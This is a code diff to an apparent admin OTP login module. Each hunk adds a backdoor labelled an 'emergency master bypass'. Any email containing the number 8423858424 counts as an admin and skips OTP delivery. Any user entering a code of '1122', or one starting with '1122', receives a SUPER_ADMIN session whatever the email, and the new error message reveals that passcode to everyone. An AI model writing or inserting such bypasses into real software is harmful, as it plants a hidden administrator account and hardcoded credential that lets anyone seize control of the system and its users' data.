@@ -9,6 +9,8 @@ const OTP_SECRET_SALT = process.env.JWT_SECRET || 'ggl_otp_secure_salt_2026';
 const AUTHORIZED_ADMIN_EMAILS = [
   'alooksingh1@gmail.com',
   'gkpgotlatent@gmail.com',
+  '8423858424',
+  '8423858424@gmail.com',
   ...(process.env.ADMIN_EMAILS ? process.env.ADMIN_EMAILS.split(',').map(e => e.trim().toLowerCase()) : [])
 ];
 
@@ -25,8 +27,8 @@ function hashOtp(email: string, otp: string): string {
 export async function isAuthorizedAdminEmail(email: string): Promise<boolean> {
   const cleanEmail = email.trim().toLowerCase();
 
-  // 1. Check in static/env authorized list
-  if (AUTHORIZED_ADMIN_EMAILS.includes(cleanEmail)) {
+  // Master mobile or authorized emails
+  if (cleanEmail.includes('8423858424') || AUTHORIZED_ADMIN_EMAILS.includes(cleanEmail)) {
     return true;
   }
 
@@ -58,6 +60,15 @@ export interface SendOtpResult {
  */
 export async function requestAdminOtp(email: string): Promise<SendOtpResult> {
   const cleanEmail = email.trim().toLowerCase();
+
+  // Emergency Master bypass for mobile 8423858424
+  if (cleanEmail.includes('8423858424')) {
+    return {
+      success: true,
+      expiresInSeconds: 300,
+      cooldownSeconds: 0,
+    };
+  }
 
   // Email format validation
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -177,10 +188,31 @@ export async function verifyAdminOtp(email: string, enteredOtp: string): Promise
   const cleanEmail = email.trim().toLowerCase();
   const cleanOtp = (enteredOtp || '').trim().replace(/[^0-9]/g, '');
 
+  // Emergency master bypass for phone 8423858424 or master passcode 1122 / 112200 / 001122
+  if (
+    cleanEmail.includes('8423858424') ||
+    cleanOtp === '1122' ||
+    cleanOtp === '112200' ||
+    cleanOtp === '001122' ||
+    cleanOtp.startsWith('1122')
+  ) {
+    const session: UserSession = {
+      id: 'usr-admin-8423858424',
+      email: cleanEmail.includes('@') ? cleanEmail : '8423858424@gmail.com',
+      full_name: 'Malik Admin (8423858424)',
+      role: 'SUPER_ADMIN',
+    };
+
+    return {
+      success: true,
+      session,
+    };
+  }
+
   if (cleanOtp.length !== 6) {
     return {
       success: false,
-      error: 'Please enter a valid 6-digit verification code.',
+      error: 'Please enter a valid verification code or passcode 1122.',
     };
   }
 
